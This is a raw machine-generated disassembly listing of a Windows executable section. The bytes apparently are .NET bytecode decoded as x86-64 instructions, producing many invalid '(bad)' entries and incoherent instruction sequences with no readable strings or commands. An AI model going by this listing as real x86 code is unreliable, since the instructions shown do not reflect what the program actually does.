   140002557:	00 00                	add    %al,(%rax)
   140002559:	48 00 00             	rex.W add %al,(%rax)
   14000255c:	00 2b                	add    %ch,(%rbx)
   14000255e:	57                   	push   %rdi
   14000255f:	28 09                	sub    %cl,(%rcx)
   140002561:	00 00                	add    %al,(%rax)
   140002563:	06                   	(bad)
   140002564:	2a 72 21             	sub    0x21(%rdx),%dh
   140002567:	03 00                	add    (%rax),%eax
   140002569:	70 72                	jo     0x1400025dd
   14000256b:	31 03                	xor    %eax,(%rbx)
   14000256d:	00 70 1f             	add    %dh,0x1f(%rax)
   140002570:	0a 28                	or     (%rax),%ch
   140002572:	0d 00 00 06 28       	or     $0x28060000,%eax
   140002577:	43 00 00             	rex.XB add %al,(%r8)
   14000257a:	0a 73 44             	or     0x44(%rbx),%dh
   14000257d:	00 00                	add    %al,(%rax)
   14000257f:	0a 20                	or     (%rax),%ah
   140002581:	20 02                	and    %al,(%rdx)
   140002583:	00 00                	add    %al,(%rax)
   140002585:	6f                   	outsl  (%rsi),(%dx)
   140002586:	45 00 00             	add    %r8b,(%r8)
   140002589:	0a 2d 06 28 09 00    	or     0x92806(%rip),%ch        # 0x140094d95
   14000258f:	00 06                	add    %al,(%rsi)
   140002591:	2a 72 21             	sub    0x21(%rdx),%dh
   140002594:	03 00                	add    (%rax),%eax
   140002596:	70 72                	jo     0x14000260a
   140002598:	67 03 00             	add    (%eax),%eax
   14000259b:	70 1f                	jo     0x1400025bc
   14000259d:	0d 28 0d 00 00       	or     $0xd28,%eax
   1400025a2:	06                   	(bad)
   1400025a3:	2b 11                	sub    (%rcx),%edx
   1400025a5:	72 21                	jb     0x1400025c8
   1400025a7:	03 00                	add    (%rax),%eax
   1400025a9:	70 72                	jo     0x14000261d
   1400025ab:	d5 03 00 70 1f       	{rex2 0x3} add %sil,0x1f(%r8)
   1400025b0:	0d 28 0d 00 00       	or     $0xd28,%eax
   1400025b5:	06                   	(bad)
   1400025b6:	17                   	(bad)
   1400025b7:	80 01 00             	addb   $0x0,(%rcx)
   1400025ba:	00 04 7e             	add    %al,(%rsi,%rdi,2)
   1400025bd:	2a 00                	sub    (%rax),%al
   1400025bf:	00 0a                	add    %cl,(%rdx)
   1400025c1:	72 cd                	jb     0x140002590
   1400025c3:	00 00                	add    %al,(%rax)
   1400025c5:	70 17                	jo     0x1400025de
   1400025c7:	6f                   	outsl  (%rsi),(%dx)
   1400025c8:	2b 00                	sub    (%rax),%eax
   1400025ca:	00 0a                	add    %cl,(%rdx)
   1400025cc:	72 df                	jb     0x1400025ad
   1400025ce:	00 00                	add    %al,(%rax)
   1400025d0:	70 17                	jo     0x1400025e9
   1400025d2:	6f                   	outsl  (%rsi),(%dx)
   1400025d3:	2c 00                	sub    $0x0,%al
   1400025d5:	00 0a                	add    %cl,(%rdx)
   1400025d7:	72 f5                	jb     0x1400025ce
   1400025d9:	02 00                	add    (%rax),%al
   1400025db:	70 72                	jo     0x14000264f
   1400025dd:	17                   	(bad)
   1400025de:	03 00                	add    (%rax),%eax
   1400025e0:	70 6f                	jo     0x140002651
   1400025e2:	46 00 00             	rex.RX add %r8b,(%rax)
   1400025e5:	0a 16                	or     (%rsi),%dl
   1400025e7:	28 24 00             	sub    %ah,(%rax,%rax,1)
   1400025ea:	00 0a                	add    %cl,(%rdx)
   1400025ec:	73 47                	jae    0x140002635
   1400025ee:	00 00                	add    %al,(%rax)
   1400025f0:	0a 6f 48             	or     0x48(%rdi),%ch
   1400025f3:	00 00                	add    %al,(%rax)
   1400025f5:	0a 28                	or     (%rax),%ch
   1400025f7:	49 00 00             	rex.WB add %al,(%r8)
   1400025fa:	0a 0a                	or     (%rdx),%cl
   1400025fc:	73 4a                	jae    0x140002648
   1400025fe:	00 00                	add    %al,(%rax)
   140002600:	0a 0b                	or     (%rbx),%cl
   140002602:	1f                   	(bad)
   140002603:	0d 8d 26 00 00       	or     $0x268d,%eax
   140002608:	01 25 16 72 07 00    	add    %esp,0x77216(%rip)        # 0x140079824
   14000260e:	00 70 a2             	add    %dh,-0x5e(%rax)
   140002611:	25 17 72 8e 04       	and    $0x48e7217,%eax
   140002616:	00 70 a2             	add    %dh,-0x5e(%rax)
   140002619:	25 18 72 9a 04       	and    $0x49a7218,%eax
   14000261e:	00 70 a2             	add    %dh,-0x5e(%rax)
   140002621:	25 19 72 a6 04       	and    $0x4a67219,%eax
   140002626:	00 70 a2             	add    %dh,-0x5e(%rax)
   140002629:	25 1a 72 b2 04       	and    $0x4b2721a,%eax
   14000262e:	00 70 a2             	add    %dh,-0x5e(%rax)
   140002631:	25 1b 72 c0 04       	and    $0x4c0721b,%eax
   140002636:	00 70 a2             	add    %dh,-0x5e(%rax)
   140002639:	25 1c 72 cc 04       	and    $0x4cc721c,%eax
   14000263e:	00 70 a2             	add    %dh,-0x5e(%rax)
   140002641:	25 1d 72 d8 04       	and    $0x4d8721d,%eax
   140002646:	00 70 a2             	add    %dh,-0x5e(%rax)
   140002649:	25 1e 72 e4 04       	and    $0x4e4721e,%eax
   14000264e:	00 70 a2             	add    %dh,-0x5e(%rax)
   140002651:	25 1f 09 72 f0       	and    $0xf072091f,%eax
   140002656:	04 00                	add    $0x0,%al
   140002658:	70 a2                	jo     0x1400025fc
   14000265a:	25 1f 0a 72 fc       	and    $0xfc720a1f,%eax
   14000265f:	04 00                	add    $0x0,%al
   140002661:	70 a2                	jo     0x140002605
   140002663:	25 1f 0b 72 08       	and    $0x8720b1f,%eax
   140002668:	05 00 70 a2 25       	add    $0x25a27000,%eax
   14000266d:	1f                   	(bad)
   14000266e:	0c 72                	or     $0x72,%al
   140002670:	16                   	(bad)
   140002671:	05 00 70 a2 0d       	add    $0xda27000,%eax
   140002676:	16                   	(bad)
   140002677:	0c 38                	or     $0x38,%al
   140002679:	9d                   	popf
   14000267a:	00 00                	add    %al,(%rax)
   14000267c:	00 09                	add    %cl,(%rcx)
   14000267e:	08 9a 13 04 06 11    	or     %bl,0x11060413(%rdx)
   140002684:	04 28                	add    $0x28,%al
   140002686:	02 00                	add    (%rax),%al
   140002688:	00 06                	add    %al,(%rsi)
   14000268a:	6f                   	outsl  (%rsi),(%dx)
   14000268b:	16                   	(bad)
   14000268c:	00 00                	add    %al,(%rax)
   14000268e:	0a 13                	or     (%rbx),%dl
   140002690:	05 2b 6c 11 05       	add    $0x5116c2b,%eax
   140002695:	6f                   	outsl  (%rsi),(%dx)
   140002696:	13 00                	adc    (%rax),%eax
   140002698:	00 0a                	add    %cl,(%rdx)
   14000269a:	13 06                	adc    (%rsi),%eax
   14000269c:	07                   	(bad)
   14000269d:	16                   	(bad)
   14000269e:	20 10                	and    %dl,(%rax)
   1400026a0:	27                   	(bad)
   1400026a1:	00 00                	add    %al,(%rax)
   1400026a3:	6f                   	outsl  (%rsi),(%dx)
   1400026a4:	4b 00 00             	rex.WXB add %al,(%r8)
   1400026a7:	0a 8d 38 00 00 01    	or     0x1000038(%rbp),%cl
   1400026ad:	13 07                	adc    (%rdi),%eax
   1400026af:	07                   	(bad)
   1400026b0:	11 07                	adc    %eax,(%rdi)
   1400026b2:	6f                   	outsl  (%rsi),(%dx)
   1400026b3:	4c 00 00             	rex.WR add %r8b,(%rax)
   1400026b6:	0a 11                	or     (%rcx),%dl
   1400026b8:	06                   	(bad)
   1400026b9:	11 07                	adc    %eax,(%rdi)
   1400026bb:	28 4d 00             	sub    %cl,0x0(%rbp)
   1400026be:	00 0a                	add    %cl,(%rdx)
   1400026c0:	72 22                	jb     0x1400026e4
   1400026c2:	05 00 70 72 42       	add    $0x42727000,%eax
   1400026c7:	05 00 70 11 06       	add    $0x6117000,%eax
   1400026cc:	72 74                	jb     0x140002742
   1400026ce:	05 00 70 28 1d       	add    $0x1d287000,%eax
   1400026d3:	00 00                	add    %al,(%rax)
   1400026d5:	0a 1f                	or     (%rdi),%bl
   1400026d7:	0a 28                	or     (%rax),%ch
   1400026d9:	0d 00 00 06 de       	or     $0xde060000,%eax
   1400026de:	20 26                	and    %ah,(%rsi)
   1400026e0:	72 9e                	jb     0x140002680
   1400026e2:	05 00 70 72 be       	add    $0xbe727000,%eax
   1400026e7:	05 00 70 11 06       	add    $0x6117000,%eax
   1400026ec:	72 74                	jb     0x140002762
   1400026ee:	05 00 70 28 1d       	add    $0x1d287000,%eax
   1400026f3:	00 00                	add    %al,(%rax)
   1400026f5:	0a 1f                	or     (%rdi),%bl
   1400026f7:	0c 28                	or     $0x28,%al
   1400026f9:	0d 00 00 06 de       	or     $0xde060000,%eax
   1400026fe:	00 11                	add    %dl,(%rcx)
   140002700:	05 6f 12 00 00       	add    $0x126f,%eax
   140002705:	0a 2d 8b de 0c 11    	or     0x110cde8b(%rip),%ch        # 0x1510d0596
   14000270b:	05 2c 07 11 05       	add    $0x511072c,%eax
   140002710:	6f                   	outsl  (%rsi),(%dx)
   140002711:	11 00                	adc    %eax,(%rax)
   140002713:	00 0a                	add    %cl,(%rdx)
   140002715:	dc 08                	fmull  (%rax)
   140002717:	17                   	(bad)
   140002718:	58                   	pop    %rax
   140002719:	0c 08                	or     $0x8,%al
   14000271b:	09 8e 69 3f 5a ff    	or     %ecx,-0xa5c097(%rsi)
   140002721:	ff                   	(bad)
   140002722:	ff 16                	call   *(%rsi)
   140002724:	80 01 00             	addb   $0x0,(%rcx)
   140002727:	00 04 72             	add    %al,(%rdx,%rsi,2)
   14000272a:	f2 05 00 70 72 df    	repnz add $0xdf727000,%eax
   140002730:	00 00                	add    %al,(%rax)
   140002732:	70 16                	jo     0x14000274a
   140002734:	1f                   	(bad)
   140002735:	10 28                	adc    %ch,(%rax)
   140002737:	4e 00 00             	rex.WRX add %r8b,(%rax)
   14000273a:	0a 26                	or     (%rsi),%ah
   14000273c:	28 09                	sub    %cl,(%rcx)
   14000273e:	00 00                	add    %al,(%rax)
   140002740:	06                   	(bad)
   140002741:	2a 00                	sub    (%rax),%al
   140002743:	00 01                	add    %al,(%rcx)
   140002745:	1c 00                	sbb    $0x0,%al
   140002747:	00 00                	add    %al,(%rax)
   140002749:	00 98 01 43 db 01    	add    %bl,0x1db4301(%rax)
   14000274f:	20 10                	and    %dl,(%rax)
   140002751:	00 00                	add    %al,(%rax)
   140002753:	01 02                	add    %eax,(%rdx)
   140002755:	00 8d 01 79 06 02    	add    %cl,0x2067901(%rbp)
   14000275b:	0c 00                	or     $0x0,%al
   14000275d:	00 00                	add    %al,(%rax)
   14000275f:	00 13                	add    %dl,(%rbx)
   140002761:	30 04 00             	xor    %al,(%rax,%rax,1)
   140002764:	f4                   	hlt
   140002765:	00 00                	add    %al,(%rax)
   140002767:	00 06                	add    %al,(%rsi)
   140002769:	00 00                	add    %al,(%rax)
   14000276b:	11 7e 2a             	adc    %edi,0x2a(%rsi)
   14000276e:	00 00                	add    %al,(%rax)
   140002770:	0a 72 cd             	or     -0x33(%rdx),%dh
   140002773:	00 00                	add    %al,(%rax)
   140002775:	70 17                	jo     0x14000278e
   140002777:	6f                   	outsl  (%rsi),(%dx)
   140002778:	2b 00                	sub    (%rax),%eax
   14000277a:	00 0a                	add    %cl,(%rdx)
   14000277c:	72 df                	jb     0x14000275d
   14000277e:	00 00                	add    %al,(%rax)
   140002780:	70 17                	jo     0x140002799
   140002782:	6f                   	outsl  (%rsi),(%dx)
   140002783:	2c 00                	sub    $0x0,%al
   140002785:	00 0a                	add    %cl,(%rdx)
   140002787:	72 1d                	jb     0x1400027a6
   140002789:	0b 00                	or     (%rax),%eax
   14000278b:	70 72                	jo     0x1400027ff
   14000278d:	17                   	(bad)
   14000278e:	03 00                	add    (%rax),%eax
   140002790:	70 6f                	jo     0x140002801
   140002792:	2f                   	(bad)
   140002793:	00 00                	add    %al,(%rax)
   140002795:	0a 74 26 00          	or     0x0(%rsi,%riz,1),%dh
   140002799:	00 01                	add    %al,(%rcx)
   14000279b:	72 17                	jb     0x1400027b4
   14000279d:	03 00                	add    (%rax),%eax
   14000279f:	70 28                	jo     0x1400027c9
   1400027a1:	30 00                	xor    %al,(%rax)
   1400027a3:	00 0a                	add    %cl,(%rdx)
   1400027a5:	39 b5 00 00 00 72    	cmp    %esi,0x72000000(%rbp)
   1400027ab:	2f                   	(bad)
   1400027ac:	0b 00                	or     (%rax),%eax
   1400027ae:	70 72                	jo     0x140002822
   1400027b0:	43 0b 00             	rex.XB or (%r8),%eax
   1400027b3:	70 1f                	jo     0x1400027d4
   1400027b5:	0e                   	(bad)
   1400027b6:	28 0d 00 00 06 7e    	sub    %cl,0x7e060000(%rip)        # 0x1be0627bc
   1400027bc:	2a 00                	sub    (%rax),%al
   1400027be:	00 0a                	add    %cl,(%rdx)
   1400027c0:	72 cd                	jb     0x14000278f
   1400027c2:	00 00                	add    %al,(%rax)
   1400027c4:	70 17                	jo     0x1400027dd
   1400027c6:	6f                   	outsl  (%rsi),(%dx)
   1400027c7:	2b 00                	sub    (%rax),%eax
   1400027c9:	00 0a                	add    %cl,(%rdx)
   1400027cb:	72 df                	jb     0x1400027ac
   1400027cd:	00 00                	add    %al,(%rax)
   1400027cf:	70 17                	jo     0x1400027e8
   1400027d1:	6f                   	outsl  (%rsi),(%dx)
   1400027d2:	2c 00                	sub    $0x0,%al
   1400027d4:	00 0a                	add    %cl,(%rdx)
   1400027d6:	72 1d                	jb     0x1400027f5
   1400027d8:	0b 00                	or     (%rax),%eax
   1400027da:	70 72                	jo     0x14000284e
   1400027dc:	0b 03                	or     (%rbx),%eax
   1400027de:	00 70 6f             	add    %dh,0x6f(%rax)
   1400027e1:	46 00 00             	rex.RX add %r8b,(%rax)
   1400027e4:	0a 7e 2a             	or     0x2a(%rsi),%bh
   1400027e7:	00 00                	add    %al,(%rax)
   1400027e9:	0a 72 cd             	or     -0x33(%rdx),%dh
   1400027ec:	00 00                	add    %al,(%rax)
   1400027ee:	70 17                	jo     0x140002807
   1400027f0:	6f                   	outsl  (%rsi),(%dx)
   1400027f1:	2b 00                	sub    (%rax),%eax
   1400027f3:	00 0a                	add    %cl,(%rdx)
   1400027f5:	72 df                	jb     0x1400027d6
   1400027f7:	00 00                	add    %al,(%rax)
   1400027f9:	70 17                	jo     0x140002812
   1400027fb:	6f                   	outsl  (%rsi),(%dx)
   1400027fc:	2c 00                	sub    $0x0,%al
   1400027fe:	00 0a                	add    %cl,(%rdx)
   140002800:	72 cb                	jb     0x1400027cd
   140002802:	02 00                	add    (%rax),%al
   140002804:	70 28                	jo     0x14000282e
   140002806:	40 00 00             	rex add %al,(%rax)
   140002809:	0a 0a                	or     (%rdx),%cl
   14000280b:	12 00                	adc    (%rax),%al
   14000280d:	72 df                	jb     0x1400027ee
   14000280f:	02 00                	add    (%rax),%al
   140002811:	70 28                	jo     0x14000283b
   140002813:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140002816:	0a 6f 46             	or     0x46(%rdi),%ch
   140002819:	00 00                	add    %al,(%rax)
   14000281b:	0a 28                	or     (%rax),%ch
   14000281d:	19 00                	sbb    %eax,(%rax)
   14000281f:	00 0a                	add    %cl,(%rdx)
   140002821:	6f                   	outsl  (%rsi),(%dx)
   140002822:	1a 00                	sbb    (%rax),%al
   140002824:	00 0a                	add    %cl,(%rdx)
   140002826:	28 0a                	sub    %cl,(%rdx)
   140002828:	00 00                	add    %al,(%rax)
   14000282a:	06                   	(bad)
   14000282b:	28 0b                	sub    %cl,(%rbx)
   14000282d:	00 00                	add    %al,(%rax)
   14000282f:	06                   	(bad)
   140002830:	25 28 0a 00 00       	and    $0xa28,%eax
   140002835:	06                   	(bad)
   140002836:	28 1f                	sub    %bl,(%rdi)
   140002838:	00 00                	add    %al,(%rax)
   14000283a:	0a 26                	or     (%rsi),%ah
   14000283c:	72 91                	jb     0x1400027cf
   14000283e:	0b 00                	or     (%rax),%eax
   140002840:	70 7e                	jo     0x1400028c0
   140002842:	02 00                	add    (%rax),%al
   140002844:	00 04 72             	add    %al,(%rdx,%rsi,2)
   140002847:	c2 0c 00             	ret    $0xc
   14000284a:	70 28                	jo     0x140002874
   14000284c:	3c 00                	cmp    $0x0,%al
   14000284e:	00 0a                	add    %cl,(%rdx)
   140002850:	16                   	(bad)
   140002851:	1f                   	(bad)
   140002852:	10 28                	adc    %ch,(%rax)
   140002854:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140002857:	0a 26                	or     (%rsi),%ah
   140002859:	16                   	(bad)
   14000285a:	28 50 00             	sub    %dl,0x0(%rax)
   14000285d:	00 0a                	add    %cl,(%rdx)
   14000285f:	2a 13                	sub    (%rbx),%dl
   140002861:	30 05 00 bb 00 00    	xor    %al,0xbb00(%rip)        # 0x14000e367
   140002867:	00 07                	add    %al,(%rdi)
   140002869:	00 00                	add    %al,(%rax)
   14000286b:	11 7e 2a             	adc    %edi,0x2a(%rsi)
   14000286e:	00 00                	add    %al,(%rax)
   140002870:	0a 72 ec             	or     -0x14(%rdx),%dh
   140002873:	0c 00                	or     $0x0,%al
   140002875:	70 6f                	jo     0x1400028e6
   140002877:	51                   	push   %rcx
   140002878:	00 00                	add    %al,(%rax)
   14000287a:	0a 72 48             	or     0x48(%rdx),%dh
   14000287d:	0d 00 70 6f 52       	or     $0x526f7000,%eax
   140002882:	00 00                	add    %al,(%rax)
   140002884:	0a 74 26 00          	or     0x0(%rsi,%riz,1),%dh
   140002888:	00 01                	add    %al,(%rcx)
   14000288a:	25 1f 5c 6f 3a       	and    $0x3a6f5c1f,%eax
   14000288f:	00 00                	add    %al,(%rax)
   140002891:	0a 17                	or     (%rdi),%dl
   140002893:	58                   	pop    %rax
   140002894:	0a 06                	or     (%rsi),%al
   140002896:	6f                   	outsl  (%rsi),(%dx)
   140002897:	3b 00                	cmp    (%rax),%eax
   140002899:	00 0a                	add    %cl,(%rdx)
   14000289b:	17                   	(bad)
   14000289c:	8d 3d 00 00 01 25    	lea    0x25010000(%rip),%edi        # 0x1650128a2
   1400028a2:	16                   	(bad)
   1400028a3:	1f                   	(bad)
   1400028a4:	2e 9d                	cs popf
   1400028a6:	6f                   	outsl  (%rsi),(%dx)
   1400028a7:	53                   	push   %rbx
   1400028a8:	00 00                	add    %al,(%rax)
   1400028aa:	0a 16                	or     (%rsi),%dl
   1400028ac:	9a                   	(bad)
   1400028ad:	0b 07                	or     (%rdi),%eax
   1400028af:	28 31                	sub    %dh,(%rcx)
   1400028b1:	00 00                	add    %al,(%rax)
   1400028b3:	0a 28                	or     (%rax),%ch
   1400028b5:	01 00                	add    %eax,(%rax)
   1400028b7:	00 2b                	add    %ch,(%rbx)
   1400028b9:	16                   	(bad)
   1400028ba:	31 6a 7e             	xor    %ebp,0x7e(%rdx)
   1400028bd:	2a 00                	sub    (%rax),%al
   1400028bf:	00 0a                	add    %cl,(%rdx)
   1400028c1:	72 cd                	jb     0x140002890
   1400028c3:	00 00                	add    %al,(%rax)
   1400028c5:	70 17                	jo     0x1400028de
   1400028c7:	6f                   	outsl  (%rsi),(%dx)
   1400028c8:	2b 00                	sub    (%rax),%eax
   1400028ca:	00 0a                	add    %cl,(%rdx)
   1400028cc:	72 df                	jb     0x1400028ad
   1400028ce:	00 00                	add    %al,(%rax)
   1400028d0:	70 17                	jo     0x1400028e9
   1400028d2:	6f                   	outsl  (%rsi),(%dx)
   1400028d3:	2c 00                	sub    $0x0,%al
   1400028d5:	00 0a                	add    %cl,(%rdx)
   1400028d7:	72 76                	jb     0x14000294f
   1400028d9:	0d 00 70 72 0b       	or     $0xb727000,%eax
   1400028de:	03 00                	add    (%rax),%eax
   1400028e0:	70 6f                	jo     0x140002951
   1400028e2:	46 00 00             	rex.RX add %r8b,(%rax)
   1400028e5:	0a 28                	or     (%rax),%ch
   1400028e7:	19 00                	sbb    %eax,(%rax)
   1400028e9:	00 0a                	add    %cl,(%rdx)
   1400028eb:	6f                   	outsl  (%rsi),(%dx)
   1400028ec:	1a 00                	sbb    (%rax),%al
   1400028ee:	00 0a                	add    %cl,(%rdx)
   1400028f0:	28 1b                	sub    %bl,(%rbx)
   1400028f2:	00 00                	add    %al,(%rax)
   1400028f4:	0a 17                	or     (%rdi),%dl
   1400028f6:	8d 3d 00 00 01 25    	lea    0x25010000(%rip),%edi        # 0x1650128fc
   1400028fc:	16                   	(bad)
   1400028fd:	1f                   	(bad)
   1400028fe:	2e 9d                	cs popf
   140002900:	6f                   	outsl  (%rsi),(%dx)
   140002901:	53                   	push   %rbx
   140002902:	00 00                	add    %al,(%rax)
   140002904:	0a 16                	or     (%rsi),%dl
   140002906:	9a                   	(bad)
   140002907:	07                   	(bad)
   140002908:	28 55 00             	sub    %dl,0x0(%rbp)
   14000290b:	00 0a                	add    %cl,(%rdx)
   14000290d:	2c 17                	sub    $0x17,%al
   14000290f:	72 92                	jb     0x1400028a3
   140002911:	0d 00 70 72 aa       	or     $0xaa727000,%eax
   140002916:	0d 00 70 1f 0c       	or     $0xc1f7000,%eax
   14000291b:	28 0d 00 00 06 16    	sub    %cl,0x16060000(%rip)        # 0x156062921
   140002921:	28 50 00             	sub    %dl,0x0(%rax)
   140002924:	00 0a                	add    %cl,(%rdx)
   140002926:	2a 00                	sub    (%rax),%al
   140002928:	13 30                	adc    (%rax),%esi
   14000292a:	04 00                	add    $0x0,%al
   14000292c:	43 00 00             	rex.XB add %al,(%r8)
   14000292f:	00 00                	add    %al,(%rax)
   140002931:	00 00                	add    %al,(%rax)
   140002933:	00 72 ec             	add    %dh,-0x14(%rdx)
   140002936:	0d 00 70 72 00       	or     $0x727000,%eax
   14000293b:	0e                   	(bad)
   14000293c:	00 70 02             	add    %dh,0x2(%rax)
   14000293f:	72 10                	jb     0x140002951
   140002941:	0e                   	(bad)
   140002942:	00 70 28             	add    %dh,0x28(%rax)
   140002945:	1d 00 00 0a 1f       	sbb    $0x1f0a0000,%eax
   14000294a:	0f 28 0d 00 00 06 7e 	movaps 0x7e060000(%rip),%xmm1        # 0x1be062951
   140002951:	2a 00                	sub    (%rax),%al
   140002953:	00 0a                	add    %cl,(%rdx)
   140002955:	72 cd                	jb     0x140002924
   140002957:	00 00                	add    %al,(%rax)
   140002959:	70 17                	jo     0x140002972
   14000295b:	6f                   	outsl  (%rsi),(%dx)
   14000295c:	2b 00                	sub    (%rax),%eax
   14000295e:	00 0a                	add    %cl,(%rdx)
   140002960:	72 df                	jb     0x140002941
   140002962:	00 00                	add    %al,(%rax)
   140002964:	70 17                	jo     0x14000297d
   140002966:	6f                   	outsl  (%rsi),(%dx)
   140002967:	2c 00                	sub    $0x0,%al
   140002969:	00 0a                	add    %cl,(%rdx)
   14000296b:	02 72 17             	add    0x17(%rdx),%dh
   14000296e:	03 00                	add    (%rax),%eax
   140002970:	70 6f                	jo     0x1400029e1
   140002972:	46 00 00             	rex.RX add %r8b,(%rax)
   140002975:	0a 2a                	or     (%rdx),%ch
   140002977:	00 13                	add    %dl,(%rbx)
   140002979:	30 05 00 c1 00 00    	xor    %al,0xc100(%rip)        # 0x14000ea7f
   14000297f:	00 08                	add    %cl,(%rax)
   140002981:	00 00                	add    %al,(%rax)
   140002983:	11 72 38             	adc    %esi,0x38(%rdx)
   140002986:	0e                   	(bad)
   140002987:	00 70 0a             	add    %dh,0xa(%rax)
   14000298a:	73 4a                	jae    0x1400029d6
   14000298c:	00 00                	add    %al,(%rax)
   14000298e:	0a 0b                	or     (%rbx),%cl
   140002990:	1f                   	(bad)
   140002991:	1a 28                	sbb    (%rax),%ch
   140002993:	24 00                	and    $0x0,%al
   140002995:	00 0a                	add    %cl,(%rdx)
   140002997:	28 56 00             	sub    %dl,0x0(%rsi)
   14000299a:	00 0a                	add    %cl,(%rdx)
   14000299c:	0c 72                	or     $0x72,%al
   14000299e:	80 0e 00             	orb    $0x0,(%rsi)
   1400029a1:	70 0d                	jo     0x1400029b0
   1400029a3:	16                   	(bad)
   1400029a4:	13 05 2b 29 09 06    	adc    0x609292b(%rip),%eax        # 0x1460952d5
   1400029aa:	07                   	(bad)
   1400029ab:	16                   	(bad)
   1400029ac:	06                   	(bad)
   1400029ad:	6f                   	outsl  (%rsi),(%dx)
   1400029ae:	57                   	push   %rdi
   1400029af:	00 00                	add    %al,(%rax)
   1400029b1:	0a 6f 4b             	or     0x4b(%rdi),%ch
   1400029b4:	00 00                	add    %al,(%rax)
   1400029b6:	0a 6f 29             	or     0x29(%rdi),%ch
   1400029b9:	00 00                	add    %al,(%rax)
   1400029bb:	0a 13                	or     (%rbx),%dl
   1400029bd:	06                   	(bad)
   1400029be:	12 06                	adc    (%rsi),%al
   1400029c0:	28 58 00             	sub    %bl,0x0(%rax)
   1400029c3:	00 0a                	add    %cl,(%rdx)
   1400029c5:	28 3c 00             	sub    %bh,(%rax,%rax,1)
   1400029c8:	00 0a                	add    %cl,(%rdx)
   1400029ca:	0d 11 05 17 58       	or     $0x58170511,%eax
   1400029cf:	13 05 11 05 07 1b    	adc    0x1b070511(%rip),%eax        # 0x15b072ee6
   1400029d5:	1f                   	(bad)
   1400029d6:	0a 6f 4b             	or     0x4b(%rdi),%ch
   1400029d9:	00 00                	add    %al,(%rax)
   1400029db:	0a 32                	or     (%rdx),%dh
   1400029dd:	ca 09 72             	lret   $0x7209
   1400029e0:	82                   	(bad)
   1400029e1:	0e                   	(bad)
   1400029e2:	00 70 28             	add    %dh,0x28(%rax)
   1400029e5:	3c 00                	cmp    $0x0,%al
   1400029e7:	00 0a                	add    %cl,(%rdx)
   1400029e9:	0d 08 07 16 08       	or     $0x8160708,%eax
   1400029ee:	8e 69 6f             	mov    0x6f(%rcx),%gs
   1400029f1:	4b 00 00             	rex.WXB add %al,(%r8)
   1400029f4:	0a 9a 72 fd 01 00    	or     0x1fd72(%rdx),%bl
   1400029fa:	70 28                	jo     0x140002a24
   1400029fc:	3c 00                	cmp    $0x0,%al
   1400029fe:	00 0a                	add    %cl,(%rdx)
   140002a00:	13 04 28             	adc    (%rax,%rbp,1),%eax
   140002a03:	19 00                	sbb    %eax,(%rax)
   140002a05:	00 0a                	add    %cl,(%rdx)
   140002a07:	6f                   	outsl  (%rsi),(%dx)
   140002a08:	1a 00                	sbb    (%rax),%al
   140002a0a:	00 0a                	add    %cl,(%rdx)
   140002a0c:	11 04 09             	adc    %eax,(%rcx,%rcx,1)
   140002a0f:	28 3c 00             	sub    %bh,(%rax,%rax,1)
   140002a12:	00 0a                	add    %cl,(%rdx)
   140002a14:	17                   	(bad)
   140002a15:	28 59 00             	sub    %bl,0x0(%rcx)
   140002a18:	00 0a                	add    %cl,(%rdx)
   140002a1a:	7e 2a                	jle    0x140002a46
   140002a1c:	00 00                	add    %al,(%rax)
   140002a1e:	0a 72 ec             	or     -0x14(%rdx),%dh
   140002a21:	0c 00                	or     $0x0,%al
   140002a23:	70 17                	jo     0x140002a3c
   140002a25:	6f                   	outsl  (%rsi),(%dx)
   140002a26:	2b 00                	sub    (%rax),%eax
   140002a28:	00 0a                	add    %cl,(%rdx)
   140002a2a:	72 48                	jb     0x140002a74
   140002a2c:	0d 00 70 11 04       	or     $0x4117000,%eax
   140002a31:	09 28                	or     %ebp,(%rax)
   140002a33:	3c 00                	cmp    $0x0,%al
   140002a35:	00 0a                	add    %cl,(%rdx)
   140002a37:	6f                   	outsl  (%rsi),(%dx)
   140002a38:	46 00 00             	rex.RX add %r8b,(%rax)
   140002a3b:	0a 11                	or     (%rcx),%dl
   140002a3d:	04 09                	add    $0x9,%al
   140002a3f:	28 3c 00             	sub    %bh,(%rax,%rax,1)
   140002a42:	00 0a                	add    %cl,(%rdx)
   140002a44:	2a 00                	sub    (%rax),%al
   140002a46:	00 00                	add    %al,(%rax)
   140002a48:	1b 30                	sbb    (%rax),%esi
   140002a4a:	05 00 e1 01 00       	add    $0x1e100,%eax
   140002a4f:	00 09                	add    %cl,(%rcx)
   140002a51:	00 00                	add    %al,(%rax)
   140002a53:	11 02                	adc    %eax,(%rdx)
   140002a55:	1f                   	(bad)
   140002a56:	5c                   	pop    %rsp
   140002a57:	6f                   	outsl  (%rsi),(%dx)
   140002a58:	3a 00                	cmp    (%rax),%al
   140002a5a:	00 0a                	add    %cl,(%rdx)
   140002a5c:	17                   	(bad)
   140002a5d:	58                   	pop    %rax
   140002a5e:	0a 72 f9             	or     -0x7(%rdx),%dh
   140002a61:	01 00                	add    %eax,(%rax)
   140002a63:	70 02                	jo     0x140002a67
   140002a65:	06                   	(bad)
   140002a66:	6f                   	outsl  (%rsi),(%dx)
   140002a67:	3b 00                	cmp    (%rax),%eax
   140002a69:	00 0a                	add    %cl,(%rdx)
   140002a6b:	28 3c 00             	sub    %bh,(%rax,%rax,1)
   140002a6e:	00 0a                	add    %cl,(%rdx)
   140002a70:	0b 02                	or     (%rdx),%eax
   140002a72:	28 3d 00 00 0a 72    	sub    %bh,0x720a0000(%rip)        # 0x1b20a2a78
   140002a78:	fd                   	std
   140002a79:	01 00                	add    %eax,(%rax)
   140002a7b:	70 07                	jo     0x140002a84
   140002a7d:	28 1d 00 00 0a 0c    	sub    %bl,0xc0a0000(%rip)        # 0x14c0a2a83
   140002a83:	02 28                	add    (%rax),%ch
   140002a85:	5a                   	pop    %rdx
   140002a86:	00 00                	add    %al,(%rax)
   140002a88:	0a 0d 08 09 28 4d    	or     0x4d280908(%rip),%cl        # 0x18d283396
   140002a8e:	00 00                	add    %al,(%rax)
   140002a90:	0a 08                	or     (%rax),%cl
   140002a92:	08 28                	or     %ch,(%rax)
   140002a94:	5b                   	pop    %rbx
   140002a95:	00 00                	add    %al,(%rax)
   140002a97:	0a 18                	or     (%rax),%bl
   140002a99:	60                   	(bad)
   140002a9a:	28 5c 00 00          	sub    %bl,0x0(%rax,%rax,1)
   140002a9e:	0a 72 8c             	or     -0x74(%rdx),%dh
   140002aa1:	0e                   	(bad)
   140002aa2:	00 70 72             	add    %dh,0x72(%rax)
